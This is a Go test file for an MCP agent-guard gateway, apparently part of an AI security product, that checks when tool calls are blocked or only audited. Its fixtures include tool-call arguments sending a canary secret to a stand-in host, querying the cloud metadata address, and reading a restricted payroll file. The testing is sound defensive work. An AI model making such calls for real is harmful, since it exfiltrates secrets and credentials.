package handler

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/http/httputil"
	"net/url"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/yangjiyj/aiguard/apps/gateway-core/internal/agentguard"
	"github.com/yangjiyj/aiguard/apps/gateway-core/internal/modelrouter"
	"github.com/yangjiyj/aiguard/packages/shared-go/protection"
)

// 2.9.22 起没有内置底线：密钥外发、元数据在防护项配成阻断时照拦（受限文件按自己的
// 动作配置）；默认配置下这些命中只告警放行（见末尾子测试）。
func TestMCPFullAgentGuardConfiguredProtectionBlocks(t *testing.T) {
	tests := []struct {
		name string
		args string
	}{
		{"restricted file", `{"path":"/srv/restricted/payroll.csv"}`},
		{"secret egress", `{"url":"https://outside.example/upload","body":"canary-test-secret-fixture"}`},
		{"metadata", `{"url":"http://169.254.169.254/latest/meta-data"}`},
		{"mixed command and egress", `{"command":"echo hello","url":"https://outside.example/upload","body":"canary-test-secret-fixture"}`},
	}
	for _, tt := range tests {
		if tt.name != "restricted file" {
			t.Run(tt.name+"/default protections", func(t *testing.T) {
				env := newWS1Env(t, false, blockTool("__none__"))
				ws1SetAgentGuardPolicy(env, &agentguard.EffectivePolicy{Mode: agentguard.ModeStrict, RuleMode: agentguard.ModeStrict})
				env.handler.toolRiskClient.cache.set("tenant_test:demo__acme_dispatch", &ToolRiskConfigResponse{ToolName: "demo__acme_dispatch", ToolType: "mcp", Action: "allow"})
				w := env.post(t, fmt.Sprintf(`{"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":"acme_dispatch","arguments":%s}}`, tt.args))
				if rpcErrorCode(t, w.Body.String()) != 0 || atomic.LoadInt32(env.upstreamHits) != 1 {
					t.Fatalf("default protections must alert and allow: upstream_hits=%d response=%s", atomic.LoadInt32(env.upstreamHits), w.Body.String())
				}
			})
		}
		for _, auditOnly := range []bool{false, true} {
			t.Run(fmt.Sprintf("%s/audit=%t", tt.name, auditOnly), func(t *testing.T) {
				env := newWS1Env(t, auditOnly, blockTool("__none__"))
				policy := &agentguard.EffectivePolicy{Mode: agentguard.ModeStrict, RuleMode: agentguard.ModeStrict,
					RestrictedFiles: &agentguard.RestrictedFilePolicy{Patterns: []string{"/srv/restricted/**"}, Action: "block"},
					Protections:     blockingProtections(protection.GroupAgentTarget, protection.GroupSkill)}
				envelope := &modelrouter.RequestEnvelope{TenantID: "tenant_test", ProjectID: "project_test", UserID: "user_test", KeyPrefix: "sk-test", EndpointType: "proxy"}
				env.handler.toolRiskClient.agentGuardPolicyCache.set(agentGuardPolicyScopeCacheKey(envelope), policy)
				env.handler.toolRiskClient.cache.set("tenant_test:demo__acme_dispatch", &ToolRiskConfigResponse{ToolName: "demo__acme_dispatch", ToolType: "mcp", Action: "allow"})
				w := env.post(t, fmt.Sprintf(`{"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":"acme_dispatch","arguments":%s}}`, tt.args))
				blocked := rpcErrorCode(t, w.Body.String()) != 0
				if blocked == auditOnly {
					t.Fatalf("audit=%t blocked=%t upstream_hits=%d response=%s", auditOnly, blocked, atomic.LoadInt32(env.upstreamHits), w.Body.String())
				}
				if !auditOnly && atomic.LoadInt32(env.upstreamHits) != 0 {
					t.Fatal("blocked call reached MCP upstream")
				}
			})
		}
	}
}

func TestMCPApprovedSkillDefaultAuditRetainsAttribution(t *testing.T) {
	env := newWS1Env(t, false, blockTool("__none__"))
	cpURL, err := url.Parse(env.controlPlane.URL)
	if err != nil {
		t.Fatal(err)
	}
	fallback := httputil.NewSingleHostReverseProxy(cpURL)
	admissionServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == skillAdmissionPath {
			_ = json.NewEncoder(w).Encode(skillAdmissionResolution{AssetID: "asset-reader", VersionID: "version-reader", Status: "approved"})
			return
		}
		fallback.ServeHTTP(w, r)
	}))
	t.Cleanup(admissionServer.Close)
	env.handler.toolRiskClient.controlPlaneURL = admissionServer.URL
	body := fmt.Sprintf(`{"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":"use_skill","arguments":{"skill":"reader","version":"1.0.0","bundle_hash":"%s"}}}`, strings.Repeat("a", 64))
	w := env.post(t, body)
	if rpcErrorCode(t, w.Body.String()) != 0 || atomic.LoadInt32(env.upstreamHits) != 1 {
		t.Fatalf("approved skill should pass with default audit: %s", w.Body.String())
	}
	logs := env.logs()
	if len(logs) != 1 || logs[0]["asset_id"] != "asset-reader" || logs[0]["definition_hash"] != strings.Repeat("a", 64) {
		t.Fatalf("Skill attribution was discarded by the default MCP audit: %+v", logs)
	}
	parameters, _ := logs[0]["parameters"].(map[string]any)
	if parameters["skill"] != "reader" || parameters["version"] != "1.0.0" || !ws1LogsContain(env, "skill_admission_approved") {
		t.Fatalf("Skill identity/admission audit was incomplete: %+v", logs)
	}
}

func TestMCPMergeDefaultAuditKeepsAnalyzerAttribution(t *testing.T) {
	next := agentguard.Decision{RawDecision: agentguard.DecisionAllow, EffectiveDecision: agentguard.DecisionAllow,
		SkillAssetID: "asset-1", SkillVersionID: "version-1", SkillName: "reader", SkillVersion: "1.0", SkillSource: "repository", SkillBundleHash: "bundle-1", SkillAdmission: "approved",
		Provenance: agentguard.ProvenanceTainted, TaintedArguments: []string{"request.url"}}
	got := mergeMCPToolDecisions(agentguard.Decision{RawDecision: agentguard.DecisionAudit, EffectiveDecision: agentguard.DecisionAudit}, next)
	if got.SkillAssetID != next.SkillAssetID || got.SkillVersionID != next.SkillVersionID || got.SkillName != next.SkillName ||
		got.SkillVersion != next.SkillVersion || got.SkillBundleHash != next.SkillBundleHash || got.SkillSource != next.SkillSource || got.SkillAdmission != next.SkillAdmission ||
		got.Provenance != next.Provenance || len(got.TaintedArguments) != 1 {
		t.Fatalf("neutral analyzer attribution lost during merge: %+v", got)
	}
}

func TestMCPBehaviorWindowUsesProtocolSessionIdentity(t *testing.T) {
	env := newWS1Env(t, false, blockTool("__none__"))
	for _, sessionID := range []string{"session-a", "session-b"} {
		req := newMCPTestRequest(`{"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/srv/public/report.txt"}}}`)
		req.Header.Set("Mcp-Session-Id", sessionID)
		req.Header.Set("MCP-Protocol-Version", mcpProtocolVersionLatest)
		w := httptest.NewRecorder()
		env.router.ServeHTTP(w, req)
		if rpcErrorCode(t, w.Body.String()) != 0 {
			t.Fatalf("benign session call blocked: %s", w.Body.String())
		}
	}
	if keys, _ := env.handler.agentGuardBehavior.TrackedKeys(); keys != 2 {
		t.Fatalf("protocol sessions shared one actor behavior key: got %d want 2", keys)
	}
}

// 2.9.22：准入服务不可用是防护项 skill.admission_unavailable 的命中，配成阻断时照拦；默认配置
// （告警放行）不拦。批次 2B 起不再读 SKILL_ADMISSION_FAIL_MODE，open 与 closed 一样处置。
func TestMCPSkillAdmissionFailureUsesSharedPolicy(t *testing.T) {
	for _, failMode := range []string{"closed", "open"} {
		for _, auditOnly := range []bool{false, true} {
			for _, configured := range []bool{true, false} {
				t.Run(fmt.Sprintf("%s/audit=%t/configured=%t", failMode, auditOnly, configured), func(t *testing.T) {
					t.Setenv("SKILL_ADMISSION_FAIL_MODE", failMode)
					env := newWS1Env(t, auditOnly, blockTool("__none__"))
					if configured {
						ws1SetAgentGuardPolicy(env, &agentguard.EffectivePolicy{Mode: agentguard.ModeStrict, RuleMode: agentguard.ModeStrict,
							Protections: blockingProtections(protection.GroupAgentTarget, protection.GroupSkill)})
					}
					body := fmt.Sprintf(`{"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":"use_skill","arguments":{"skill":"reader","version":"1.0.0","bundle_hash":"%s"}}}`, strings.Repeat("a", 64))
					w := env.post(t, body)
					blocked := rpcErrorCode(t, w.Body.String()) != 0
					if blocked != (configured && !auditOnly) {
						t.Fatalf("skill admission failure incorrectly enforced: mode=%s audit=%t configured=%t response=%s", failMode, auditOnly, configured, w.Body.String())
					}
					if !ws1LogsContain(env, "skill_admission_coverage_gap") {
						t.Fatal("Skill admission failure lost coverage-gap evidence")
					}
				})
			}
		}
	}
}
